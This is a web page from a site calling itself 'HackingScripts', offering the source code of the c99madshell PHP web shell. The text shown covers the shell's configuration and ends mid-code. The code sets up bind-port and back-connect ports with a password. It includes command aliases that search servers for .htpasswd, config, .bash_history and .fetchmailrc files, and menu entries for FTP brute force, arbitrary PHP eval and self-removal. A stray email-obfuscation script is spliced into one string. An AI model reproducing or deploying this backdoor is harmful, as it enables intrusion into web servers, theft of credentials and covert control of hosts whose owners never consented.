<!DOCTYPE html>
<html>
  <head>
    <meta charset='utf-8'>
    <meta http-equiv="X-UA-Compatible" content="chrome=1">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    <link rel="stylesheet" type="text/css" href="/HackingScripts/stylesheets/stylesheet.css" media="screen" />
    <link rel="stylesheet" type="text/css" href="/HackingScripts/stylesheets/pygment_trac.css" media="screen" />
    <link rel="stylesheet" type="text/css" href="/HackingScripts/stylesheets/print.css" media="print" />
    <link rel="stylesheet" type="text/css" href="/HackingScripts/stylesheets/styles.css" media="print" />
    <link rel="icon" type="image/x-icon" href="/HackingScripts/favicon.ico">


    <!--[if lt IE 9]>
    <script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script>
    <![endif]-->

    <title> c99madshell Script </title>
  </head>

  <body>
    <header>
      <div class="inner">
        <h1> <a href="/HackingScripts/">HackingScripts</a> </h1>
        <h2>Hack Scripts for everybody</h2>
      </div>
    </header>

    <div id="content-wrapper">
      <div class="inner clearfix">
        <section id="main-content">

          <h2>c99madshell Script</h2>
<p class="meta">12 Feb 2014</p>

<p>This is the &#8216;2.0 madnet edition&#8217; of the <a href="http://hackingscripts.com/c99-shell/" title="C99 shell">original c99 shell</a></p>

<h3>c99madshell Source Code</h3>

<div class="highlight"><pre><code class="language-php" data-lang="php"><span class="cp">&lt;?php</span>
<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">function_exists</span><span class="p">(</span><span class="s2">&quot;getmicrotime&quot;</span><span class="p">))</span> <span class="p">{</span><span class="k">function</span> <span class="nf">getmicrotime</span><span class="p">()</span> <span class="p">{</span><span class="k">list</span><span class="p">(</span><span class="nv">$usec</span><span class="p">,</span> <span class="nv">$sec</span><span class="p">)</span> <span class="o">=</span> <span class="nb">explode</span><span class="p">(</span><span class="s2">&quot; &quot;</span><span class="p">,</span> <span class="nb">microtime</span><span class="p">());</span> <span class="k">return</span> <span class="p">((</span><span class="nx">float</span><span class="p">)</span><span class="nv">$usec</span> <span class="o">+</span> <span class="p">(</span><span class="nx">float</span><span class="p">)</span><span class="nv">$sec</span><span class="p">);}}</span>
<span class="nb">error_reporting</span><span class="p">(</span><span class="mi">5</span><span class="p">);</span>
<span class="o">@</span><span class="nb">ignore_user_abort</span><span class="p">(</span><span class="k">TRUE</span><span class="p">);</span>
<span class="o">@</span><span class="nb">set_magic_quotes_runtime</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
<span class="nv">$win</span> <span class="o">=</span> <span class="nb">strtolower</span><span class="p">(</span><span class="nb">substr</span><span class="p">(</span><span class="k">PHP_OS</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">3</span><span class="p">))</span> <span class="o">==</span> <span class="s2">&quot;win&quot;</span><span class="p">;</span>
<span class="nb">define</span><span class="p">(</span><span class="s2">&quot;starttime&quot;</span><span class="p">,</span><span class="nx">getmicrotime</span><span class="p">());</span>
<span class="k">if</span> <span class="p">(</span><span class="nb">get_magic_quotes_gpc</span><span class="p">())</span> <span class="p">{</span><span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">function_exists</span><span class="p">(</span><span class="s2">&quot;strips&quot;</span><span class="p">))</span> <span class="p">{</span><span class="k">function</span> <span class="nf">strips</span><span class="p">(</span><span class="o">&amp;</span><span class="nv">$arr</span><span class="p">,</span><span class="nv">$k</span><span class="o">=</span><span class="s2">&quot;&quot;</span><span class="p">)</span> <span class="p">{</span><span class="k">if</span> <span class="p">(</span><span class="nb">is_array</span><span class="p">(</span><span class="nv">$arr</span><span class="p">))</span> <span class="p">{</span><span class="k">foreach</span><span class="p">(</span><span class="nv">$arr</span> <span class="k">as</span> <span class="nv">$k</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nv">$v</span><span class="p">)</span> <span class="p">{</span><span class="k">if</span> <span class="p">(</span><span class="nb">strtoupper</span><span class="p">(</span><span class="nv">$k</span><span class="p">)</span> <span class="o">!=</span> <span class="s2">&quot;GLOBALS&quot;</span><span class="p">)</span> <span class="p">{</span><span class="nx">strips</span><span class="p">(</span><span class="nv">$arr</span><span class="p">[</span><span class="s2">&quot;</span><span class="si">$k</span><span class="s2">&quot;</span><span class="p">]);}}}</span> <span class="k">else</span> <span class="p">{</span><span class="nv">$arr</span> <span class="o">=</span> <span class="nb">stripslashes</span><span class="p">(</span><span class="nv">$arr</span><span class="p">);}}}</span> <span class="nx">strips</span><span class="p">(</span><span class="nv">$GLOBALS</span><span class="p">);}</span>
<span class="nv">$_REQUEST</span> <span class="o">=</span> <span class="nb">array_merge</span><span class="p">(</span><span class="nv">$_COOKIE</span><span class="p">,</span><span class="nv">$_POST</span><span class="p">);</span>
<span class="k">foreach</span><span class="p">(</span><span class="nv">$_REQUEST</span> <span class="k">as</span> <span class="nv">$k</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nv">$v</span><span class="p">)</span> <span class="p">{</span><span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$$k</span><span class="p">))</span> <span class="p">{</span><span class="nv">$$k</span> <span class="o">=</span> <span class="nv">$v</span><span class="p">;}}</span>
<span class="nv">$shver</span> <span class="o">=</span> <span class="s2">&quot;2.0 madnet edition&quot;</span><span class="p">;</span>
<span class="k">if</span> <span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$surl</span><span class="p">))</span>
<span class="p">{</span>
 <span class="nv">$surl</span> <span class="o">=</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;PHP_SELF&#39;</span><span class="p">];</span>
<span class="p">}</span>
<span class="nv">$surl</span> <span class="o">=</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$surl</span><span class="p">);</span>

<span class="nv">$timelimit</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
<span class="nv">$host_allow</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s2">&quot;*&quot;</span><span class="p">);</span>
<span class="nv">$login_txt</span> <span class="o">=</span> <span class="s2">&quot;Admin area&quot;</span><span class="p">;</span>
<span class="nv">$accessdeniedmess</span> <span class="o">=</span> <span class="s2">&quot;&amp;lt;a href=</span><span class="se">\&quot;</span><span class="s2">http://securityprobe.net</span><span class="se">\&quot;</span><span class="s2">&amp;gt;c99madshell v.&quot;</span><span class="o">.</span><span class="nv">$shver</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/a&amp;gt;: access denied&quot;</span><span class="p">;</span>
<span class="nv">$gzipencode</span> <span class="o">=</span> <span class="k">TRUE</span><span class="p">;</span>
<span class="nv">$c99sh_sourcesurl</span> <span class="o">=</span> <span class="s2">&quot;http://ccteam.ru/files/c99sh_sources/&quot;</span><span class="p">;</span> <span class="c1">//Sources-server</span>
<span class="nv">$filestealth</span> <span class="o">=</span> <span class="k">TRUE</span><span class="p">;</span>
<span class="nv">$donated_html</span> <span class="o">=</span> <span class="s2">&quot;&amp;lt;center&amp;gt;&amp;lt;b&amp;gt;Owned by root&amp;lt;/b&amp;gt;&amp;lt;/center&amp;gt;&quot;</span><span class="p">;</span>
<span class="nv">$donated_act</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s2">&quot;&quot;</span><span class="p">);</span>
<span class="nv">$curdir</span> <span class="o">=</span> <span class="s2">&quot;./&quot;</span><span class="p">;</span>
<span class="nv">$tmpdir</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span><span class="p">;</span>
<span class="nv">$tmpdir_log</span> <span class="o">=</span> <span class="s2">&quot;./&quot;</span><span class="p">;</span>

<span class="nv">$log_email</span> <span class="o">=</span> <span class="s2">&quot;user@host.gov</span>
<span class="s2">/* &amp;lt;![CDATA[ */</span>
<span class="s2">(function(){try{var s,a,i,j,r,c,l,b=document.getElementsByTagName(&quot;</span><span class="nx">script</span><span class="s2">&quot;);l=b[b.length-1].previousSibling;a=l.getAttribute(&#39;data-cfemail&#39;);if(a){s=&#39;&#39;;r=parseInt(a.substr(0,2),16);for(j=2;a.length-j;j+=2){c=parseInt(a.substr(j,2),16)^r;s+=String.fromCharCode(c);}s=document.createTextNode(s);l.parentNode.replaceChild(s,l);}}catch(e){}})();</span>
<span class="s2">/* ]]&amp;gt; */</span>
<span class="s2">&quot;</span><span class="p">;</span>
<span class="nv">$sort_default</span> <span class="o">=</span> <span class="s2">&quot;0a&quot;</span><span class="p">;</span>
<span class="nv">$sort_save</span> <span class="o">=</span> <span class="k">TRUE</span><span class="p">;</span>

<span class="nv">$ftypes</span>  <span class="o">=</span> <span class="k">array</span><span class="p">(</span>
 <span class="s2">&quot;html&quot;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="k">array</span><span class="p">(</span><span class="s2">&quot;html&quot;</span><span class="p">,</span><span class="s2">&quot;htm&quot;</span><span class="p">,</span><span class="s2">&quot;shtml&quot;</span><span class="p">),</span>
 <span class="s2">&quot;txt&quot;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="k">array</span><span class="p">(</span><span class="s2">&quot;txt&quot;</span><span class="p">,</span><span class="s2">&quot;conf&quot;</span><span class="p">,</span><span class="s2">&quot;bat&quot;</span><span class="p">,</span><span class="s2">&quot;sh&quot;</span><span class="p">,</span><span class="s2">&quot;js&quot;</span><span class="p">,</span><span class="s2">&quot;bak&quot;</span><span class="p">,</span><span class="s2">&quot;doc&quot;</span><span class="p">,</span><span class="s2">&quot;log&quot;</span><span class="p">,</span><span class="s2">&quot;sfc&quot;</span><span class="p">,</span><span class="s2">&quot;cfg&quot;</span><span class="p">,</span><span class="s2">&quot;htaccess&quot;</span><span class="p">),</span>
 <span class="s2">&quot;exe&quot;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="k">array</span><span class="p">(</span><span class="s2">&quot;sh&quot;</span><span class="p">,</span><span class="s2">&quot;install&quot;</span><span class="p">,</span><span class="s2">&quot;bat&quot;</span><span class="p">,</span><span class="s2">&quot;cmd&quot;</span><span class="p">),</span>
 <span class="s2">&quot;ini&quot;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="k">array</span><span class="p">(</span><span class="s2">&quot;ini&quot;</span><span class="p">,</span><span class="s2">&quot;inf&quot;</span><span class="p">),</span>
 <span class="s2">&quot;code&quot;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="k">array</span><span class="p">(</span><span class="s2">&quot;php&quot;</span><span class="p">,</span><span class="s2">&quot;phtml&quot;</span><span class="p">,</span><span class="s2">&quot;php3&quot;</span><span class="p">,</span><span class="s2">&quot;php4&quot;</span><span class="p">,</span><span class="s2">&quot;inc&quot;</span><span class="p">,</span><span class="s2">&quot;tcl&quot;</span><span class="p">,</span><span class="s2">&quot;h&quot;</span><span class="p">,</span><span class="s2">&quot;c&quot;</span><span class="p">,</span><span class="s2">&quot;cpp&quot;</span><span class="p">,</span><span class="s2">&quot;py&quot;</span><span class="p">,</span><span class="s2">&quot;cgi&quot;</span><span class="p">,</span><span class="s2">&quot;pl&quot;</span><span class="p">),</span>
 <span class="s2">&quot;img&quot;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="k">array</span><span class="p">(</span><span class="s2">&quot;gif&quot;</span><span class="p">,</span><span class="s2">&quot;png&quot;</span><span class="p">,</span><span class="s2">&quot;jpeg&quot;</span><span class="p">,</span><span class="s2">&quot;jfif&quot;</span><span class="p">,</span><span class="s2">&quot;jpg&quot;</span><span class="p">,</span><span class="s2">&quot;jpe&quot;</span><span class="p">,</span><span class="s2">&quot;bmp&quot;</span><span class="p">,</span><span class="s2">&quot;ico&quot;</span><span class="p">,</span><span class="s2">&quot;tif&quot;</span><span class="p">,</span><span class="s2">&quot;tiff&quot;</span><span class="p">,</span><span class="s2">&quot;avi&quot;</span><span class="p">,</span><span class="s2">&quot;mpg&quot;</span><span class="p">,</span><span class="s2">&quot;mpeg&quot;</span><span class="p">),</span>
 <span class="s2">&quot;sdb&quot;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="k">array</span><span class="p">(</span><span class="s2">&quot;sdb&quot;</span><span class="p">),</span>
 <span class="s2">&quot;phpsess&quot;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="k">array</span><span class="p">(</span><span class="s2">&quot;sess&quot;</span><span class="p">),</span>
 <span class="s2">&quot;download&quot;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="k">array</span><span class="p">(</span><span class="s2">&quot;exe&quot;</span><span class="p">,</span><span class="s2">&quot;com&quot;</span><span class="p">,</span><span class="s2">&quot;pif&quot;</span><span class="p">,</span><span class="s2">&quot;src&quot;</span><span class="p">,</span><span class="s2">&quot;lnk&quot;</span><span class="p">,</span><span class="s2">&quot;zip&quot;</span><span class="p">,</span><span class="s2">&quot;rar&quot;</span><span class="p">,</span><span class="s2">&quot;gz&quot;</span><span class="p">,</span><span class="s2">&quot;tar&quot;</span><span class="p">)</span>
<span class="p">);</span>


<span class="nv">$exeftypes</span>  <span class="o">=</span> <span class="k">array</span><span class="p">(</span>
 <span class="nb">getenv</span><span class="p">(</span><span class="s2">&quot;PHPRC&quot;</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot; -q %f%&quot;</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="k">array</span><span class="p">(</span><span class="s2">&quot;php&quot;</span><span class="p">,</span><span class="s2">&quot;php3&quot;</span><span class="p">,</span><span class="s2">&quot;php4&quot;</span><span class="p">),</span>
 <span class="s2">&quot;perl %f%&quot;</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="k">array</span><span class="p">(</span><span class="s2">&quot;pl&quot;</span><span class="p">,</span><span class="s2">&quot;cgi&quot;</span><span class="p">)</span>
<span class="p">);</span>

<span class="nv">$regxp_highlight</span>  <span class="o">=</span> <span class="k">array</span><span class="p">(</span>
  <span class="k">array</span><span class="p">(</span><span class="nb">basename</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s2">&quot;PHP_SELF&quot;</span><span class="p">]),</span><span class="mi">1</span><span class="p">,</span><span class="s2">&quot;&amp;lt;font color=</span><span class="se">\&quot;</span><span class="s2">yellow</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&quot;</span><span class="p">,</span><span class="s2">&quot;&amp;lt;/font&amp;gt;&quot;</span><span class="p">),</span>
  <span class="k">array</span><span class="p">(</span><span class="s2">&quot;config.php&quot;</span><span class="p">,</span><span class="mi">1</span><span class="p">)</span> <span class="c1">// example</span>
<span class="p">);</span>

<span class="nv">$safemode_diskettes</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s2">&quot;a&quot;</span><span class="p">);</span>
<span class="nv">$hexdump_lines</span> <span class="o">=</span> <span class="mi">8</span><span class="p">;</span>
<span class="nv">$hexdump_rows</span> <span class="o">=</span> <span class="mi">24</span><span class="p">;</span>
<span class="nv">$nixpwdperpage</span> <span class="o">=</span> <span class="mi">100</span><span class="p">;</span>
<span class="nv">$bindport_pass</span> <span class="o">=</span> <span class="s2">&quot;c99mad&quot;</span><span class="p">;</span>
<span class="nv">$bindport_port</span> <span class="o">=</span> <span class="s2">&quot;31373&quot;</span><span class="p">;</span>
<span class="nv">$bc_port</span> <span class="o">=</span> <span class="s2">&quot;31373&quot;</span><span class="p">;</span>
<span class="nv">$datapipe_localport</span> <span class="o">=</span> <span class="s2">&quot;8081&quot;</span><span class="p">;</span>
<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$win</span><span class="p">)</span>
<span class="p">{</span>
 <span class="nv">$cmdaliases</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span>
  <span class="k">array</span><span class="p">(</span><span class="s2">&quot;-----------------------------------------------------------&quot;</span><span class="p">,</span> <span class="s2">&quot;ls -la&quot;</span><span class="p">),</span>
  <span class="k">array</span><span class="p">(</span><span class="s2">&quot;find all suid files&quot;</span><span class="p">,</span> <span class="s2">&quot;find / -type f -perm -04000 -ls&quot;</span><span class="p">),</span>
  <span class="k">array</span><span class="p">(</span><span class="s2">&quot;find suid files in current dir&quot;</span><span class="p">,</span> <span class="s2">&quot;find . -type f -perm -04000 -ls&quot;</span><span class="p">),</span>
  <span class="k">array</span><span class="p">(</span><span class="s2">&quot;find all sgid files&quot;</span><span class="p">,</span> <span class="s2">&quot;find / -type f -perm -02000 -ls&quot;</span><span class="p">),</span>
  <span class="k">array</span><span class="p">(</span><span class="s2">&quot;find sgid files in current dir&quot;</span><span class="p">,</span> <span class="s2">&quot;find . -type f -perm -02000 -ls&quot;</span><span class="p">),</span>
  <span class="k">array</span><span class="p">(</span><span class="s2">&quot;find config.inc.php files&quot;</span><span class="p">,</span> <span class="s2">&quot;find / -type f -name config.inc.php&quot;</span><span class="p">),</span>
  <span class="k">array</span><span class="p">(</span><span class="s2">&quot;find config* files&quot;</span><span class="p">,</span> <span class="s2">&quot;find / -type f -name </span><span class="se">\&quot;</span><span class="s2">config*</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="p">),</span>
  <span class="k">array</span><span class="p">(</span><span class="s2">&quot;find config* files in current dir&quot;</span><span class="p">,</span> <span class="s2">&quot;find . -type f -name </span><span class="se">\&quot;</span><span class="s2">config*</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="p">),</span>
  <span class="k">array</span><span class="p">(</span><span class="s2">&quot;find all writable folders and files&quot;</span><span class="p">,</span> <span class="s2">&quot;find / -perm -2 -ls&quot;</span><span class="p">),</span>
  <span class="k">array</span><span class="p">(</span><span class="s2">&quot;find all writable folders and files in current dir&quot;</span><span class="p">,</span> <span class="s2">&quot;find . -perm -2 -ls&quot;</span><span class="p">),</span>
  <span class="k">array</span><span class="p">(</span><span class="s2">&quot;find all service.pwd files&quot;</span><span class="p">,</span> <span class="s2">&quot;find / -type f -name service.pwd&quot;</span><span class="p">),</span>
  <span class="k">array</span><span class="p">(</span><span class="s2">&quot;find service.pwd files in current dir&quot;</span><span class="p">,</span> <span class="s2">&quot;find . -type f -name service.pwd&quot;</span><span class="p">),</span>
  <span class="k">array</span><span class="p">(</span><span class="s2">&quot;find all .htpasswd files&quot;</span><span class="p">,</span> <span class="s2">&quot;find / -type f -name .htpasswd&quot;</span><span class="p">),</span>
  <span class="k">array</span><span class="p">(</span><span class="s2">&quot;find .htpasswd files in current dir&quot;</span><span class="p">,</span> <span class="s2">&quot;find . -type f -name .htpasswd&quot;</span><span class="p">),</span>
  <span class="k">array</span><span class="p">(</span><span class="s2">&quot;find all .bash_history files&quot;</span><span class="p">,</span> <span class="s2">&quot;find / -type f -name .bash_history&quot;</span><span class="p">),</span>
  <span class="k">array</span><span class="p">(</span><span class="s2">&quot;find .bash_history files in current dir&quot;</span><span class="p">,</span> <span class="s2">&quot;find . -type f -name .bash_history&quot;</span><span class="p">),</span>
  <span class="k">array</span><span class="p">(</span><span class="s2">&quot;find all .fetchmailrc files&quot;</span><span class="p">,</span> <span class="s2">&quot;find / -type f -name .fetchmailrc&quot;</span><span class="p">),</span>
  <span class="k">array</span><span class="p">(</span><span class="s2">&quot;find .fetchmailrc files in current dir&quot;</span><span class="p">,</span> <span class="s2">&quot;find . -type f -name .fetchmailrc&quot;</span><span class="p">),</span>
  <span class="k">array</span><span class="p">(</span><span class="s2">&quot;list file attributes on a Linux second extended file system&quot;</span><span class="p">,</span> <span class="s2">&quot;lsattr -va&quot;</span><span class="p">),</span>
  <span class="k">array</span><span class="p">(</span><span class="s2">&quot;show opened ports&quot;</span><span class="p">,</span> <span class="s2">&quot;netstat -an | grep -i listen&quot;</span><span class="p">)</span>
 <span class="p">);</span>
<span class="p">}</span>
<span class="k">else</span>
<span class="p">{</span>
 <span class="nv">$cmdaliases</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span>
  <span class="k">array</span><span class="p">(</span><span class="s2">&quot;-----------------------------------------------------------&quot;</span><span class="p">,</span> <span class="s2">&quot;dir&quot;</span><span class="p">),</span>
  <span class="k">array</span><span class="p">(</span><span class="s2">&quot;show opened ports&quot;</span><span class="p">,</span> <span class="s2">&quot;netstat -an&quot;</span><span class="p">)</span>
 <span class="p">);</span>
<span class="p">}</span>

<span class="nv">$sess_cookie</span> <span class="o">=</span> <span class="s2">&quot;c99shvars&quot;</span><span class="p">;</span>

<span class="nv">$usefsbuff</span> <span class="o">=</span> <span class="k">TRUE</span><span class="p">;</span>
<span class="nv">$copy_unset</span> <span class="o">=</span> <span class="k">FALSE</span><span class="p">;</span>

<span class="nv">$quicklaunch</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span>
 <span class="k">array</span><span class="p">(</span><span class="s2">&quot;&amp;lt;b&amp;gt;&amp;lt;hr&amp;gt;HOME&amp;lt;/b&amp;gt;&quot;</span><span class="p">,</span><span class="nv">$surl</span><span class="p">),</span>
 <span class="k">array</span><span class="p">(</span><span class="s2">&quot;&amp;lt;b&amp;gt;&amp;lt;=&amp;lt;/b&amp;gt;&quot;</span><span class="p">,</span><span class="s2">&quot;#</span><span class="se">\&quot;</span><span class="s2"> onclick=</span><span class="se">\&quot;</span><span class="s2">history.back(1)&quot;</span><span class="p">),</span>
 <span class="k">array</span><span class="p">(</span><span class="s2">&quot;&amp;lt;b&amp;gt;=&amp;gt;&amp;lt;/b&amp;gt;&quot;</span><span class="p">,</span><span class="s2">&quot;#</span><span class="se">\&quot;</span><span class="s2"> onclick=</span><span class="se">\&quot;</span><span class="s2">history.go(1)&quot;</span><span class="p">),</span>
 <span class="k">array</span><span class="p">(</span><span class="s2">&quot;&amp;lt;b&amp;gt;UPDIR&amp;lt;/b&amp;gt;&quot;</span><span class="p">,</span><span class="s2">&quot;#</span><span class="se">\&quot;</span><span class="s2"> onclick=</span><span class="se">\&quot;</span><span class="s2">document.todo.act.value=&#39;ls&#39;;document.todo.d.value=&#39;%upd&#39;;document.todo.sort.value=&#39;%sort&#39;;document.todo.submit();&quot;</span><span class="p">),</span>
 <span class="k">array</span><span class="p">(</span><span class="s2">&quot;&amp;lt;b&amp;gt;Search&amp;lt;/b&amp;gt;&quot;</span><span class="p">,</span><span class="s2">&quot;#</span><span class="se">\&quot;</span><span class="s2"> onclick=</span><span class="se">\&quot;</span><span class="s2">document.todo.act.value=&#39;search&#39;;document.todo.d.value=&#39;%d&#39;;document.todo.submit();&quot;</span><span class="p">),</span>
 <span class="k">array</span><span class="p">(</span><span class="s2">&quot;&amp;lt;b&amp;gt;Buffer&amp;lt;/b&amp;gt;&quot;</span><span class="p">,</span><span class="s2">&quot;#</span><span class="se">\&quot;</span><span class="s2"> onclick=</span><span class="se">\&quot;</span><span class="s2">document.todo.act.value=&#39;fsbuff&#39;;document.todo.d.value=&#39;%d&#39;;document.todo.submit();&quot;</span><span class="p">),</span>
 <span class="k">array</span><span class="p">(</span><span class="s2">&quot;&amp;lt;b&amp;gt;Tools&amp;lt;/b&amp;gt;&quot;</span><span class="p">,</span><span class="s2">&quot;#</span><span class="se">\&quot;</span><span class="s2"> onclick=</span><span class="se">\&quot;</span><span class="s2">document.todo.act.value=&#39;tools&#39;;document.todo.d.value=&#39;%d&#39;;document.todo.submit();&quot;</span><span class="p">),</span>
 <span class="k">array</span><span class="p">(</span><span class="s2">&quot;&amp;lt;b&amp;gt;Proc.&amp;lt;/b&amp;gt;&quot;</span><span class="p">,</span><span class="s2">&quot;#</span><span class="se">\&quot;</span><span class="s2"> onclick=</span><span class="se">\&quot;</span><span class="s2">document.todo.act.value=&#39;processes&#39;;document.todo.d.value=&#39;%d&#39;;document.todo.submit();&quot;</span><span class="p">),</span>
 <span class="k">array</span><span class="p">(</span><span class="s2">&quot;&amp;lt;b&amp;gt;FTP brute&amp;lt;/b&amp;gt;&quot;</span><span class="p">,</span><span class="s2">&quot;#</span><span class="se">\&quot;</span><span class="s2"> onclick=</span><span class="se">\&quot;</span><span class="s2">document.todo.act.value=&#39;ftpquickbrute&#39;;document.todo.d.value=&#39;%d&#39;;document.todo.submit();&quot;</span><span class="p">),</span>
 <span class="k">array</span><span class="p">(</span><span class="s2">&quot;&amp;lt;b&amp;gt;Sec.&amp;lt;/b&amp;gt;&quot;</span><span class="p">,</span><span class="s2">&quot;#</span><span class="se">\&quot;</span><span class="s2"> onclick=</span><span class="se">\&quot;</span><span class="s2">document.todo.act.value=&#39;security&#39;;document.todo.d.value=&#39;%d&#39;;document.todo.submit();&quot;</span><span class="p">),</span>
 <span class="k">array</span><span class="p">(</span><span class="s2">&quot;&amp;lt;b&amp;gt;SQL&amp;lt;/b&amp;gt;&quot;</span><span class="p">,</span><span class="s2">&quot;#</span><span class="se">\&quot;</span><span class="s2"> onclick=</span><span class="se">\&quot;</span><span class="s2">document.todo.act.value=&#39;sql&#39;;document.todo.d.value=&#39;%d&#39;;document.todo.submit();&quot;</span><span class="p">),</span>
 <span class="k">array</span><span class="p">(</span><span class="s2">&quot;&amp;lt;b&amp;gt;PHP-code&amp;lt;/b&amp;gt;&quot;</span><span class="p">,</span><span class="s2">&quot;#</span><span class="se">\&quot;</span><span class="s2"> onclick=</span><span class="se">\&quot;</span><span class="s2">document.todo.act.value=&#39;eval&#39;;document.todo.d.value=&#39;%d&#39;;document.todo.submit();&quot;</span><span class="p">),</span>
 <span class="k">array</span><span class="p">(</span><span class="s2">&quot;&amp;lt;b&amp;gt;Self remove&amp;lt;/b&amp;gt;&quot;</span><span class="p">,</span><span class="s2">&quot;#</span><span class="se">\&quot;</span><span class="s2"> onclick=</span><span class="se">\&quot;</span><span class="s2">document.todo.act.value=&#39;selfremove&#39;;document.todo.submit();&quot;</span><span class="p">),</span>
 <span class="k">array</span><span class="p">(</span><span class="s2">&quot;&amp;lt;b&amp;gt;Logout&amp;lt;/b&amp;gt;&quot;</span><span class="p">,</span><span class="s2">&quot;#</span><span class="se">\&quot;</span><span class="s2"> onclick=</span><span class="se">\&quot;</span><span class="s2">if (confirm(&#39;Are you sure?&#39;)) window.close()&quot;</span><span class="p">)</span>
<span class="p">);</span>

<span class="nv">$highlight_background</span> <span class="o">=</span> <span class="s2">&quot;#c0c0c0&quot;</span><span class="p">;</span>
<span class="nv">$highlight_bg</span> <span class="o">=</span> <span class="s2">&quot;#FFFFFF&quot;</span><span class="p">;</span>
<span class="nv">$highlight_comment</span> <span class="o">=</span> <span class="s2">&quot;#6A6A6A&quot;</span><span class="p">;</span>
<span class="nv">$highlight_default</span> <span class="o">=</span> <span class="s2">&quot;#0000BB&quot;</span><span class="p">;</span>
<span class="nv">$highlight_html</span> <span class="o">=</span> <span class="s2">&quot;#1300FF&quot;</span><span class="p">;</span>
<span class="nv">$highlight_keyword</span> <span class="o">=</span> <span class="s2">&quot;#007700&quot;</span><span class="p">;</span>
<span class="nv">$highlight_string</span> <span class="o">=</span> <span class="s2">&quot;#000000&quot;</span><span class="p">;</span>

<span class="o">@</span><span class="nv">$f</span> <span class="o">=</span> <span class="nv">$_REQUEST</span><span class="p">[</span><span class="s2">&quot;f&quot;</span><span class="p">];</span>
<span class="o">@</span><span class="nb">extract</span><span class="p">(</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s2">&quot;c99shcook&quot;</span><span class="p">]);</span>
<span class="c1">/////////////////////////////////////</span>
<span class="o">@</span><span class="nb">set_time_limit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
<span class="nv">$tmp</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
<span class="k">foreach</span><span class="p">(</span><span class="nv">$host_allow</span> <span class="k">as</span> <span class="nv">$k</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nv">$v</span><span class="p">)</span> <span class="p">{</span><span class="nv">$tmp</span><span class="p">[]</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s2">&quot;\*&quot;</span><span class="p">,</span><span class="s2">&quot;.*&quot;</span><span class="p">,</span><span class="nb">preg_quote</span><span class="p">(</span><span class="nv">$v</span><span class="p">));}</span>
<span class="nv">$s</span> <span class="o">=</span> <span class="s2">&quot;!^(&quot;</span><span class="o">.</span><span class="nb">implode</span><span class="p">(</span><span class="s2">&quot;|&quot;</span><span class="p">,</span><span class="nv">$tmp</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;)$!i&quot;</span><span class="p">;</span>
<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">preg_match</span><span class="p">(</span><span class="nv">$s</span><span class="p">,</span><span class="nb">getenv</span><span class="p">(</span><span class="s2">&quot;REMOTE_ADDR&quot;</span><span class="p">))</span> <span class="k">and</span> <span class="o">!</span><span class="nb">preg_match</span><span class="p">(</span><span class="nv">$s</span><span class="p">,</span><span class="nb">gethostbyaddr</span><span class="p">(</span><span class="nb">getenv</span><span class="p">(</span><span class="s2">&quot;REMOTE_ADDR&quot;</span><span class="p">))))</span> <span class="p">{</span><span class="k">exit</span><span class="p">(</span><span class="s2">&quot;&amp;lt;a href=</span><span class="se">\&quot;</span><span class="s2">http://securityprobe.net</span><span class="se">\&quot;</span><span class="s2">&amp;gt;c99madshell&amp;lt;/a&amp;gt;: Access Denied - your host (&quot;</span><span class="o">.</span><span class="nb">getenv</span><span class="p">(</span><span class="s2">&quot;REMOTE_ADDR&quot;</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;) not allow&quot;</span><span class="p">);}</span>
<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$login</span><span class="p">))</span>
<span class="p">{</span>
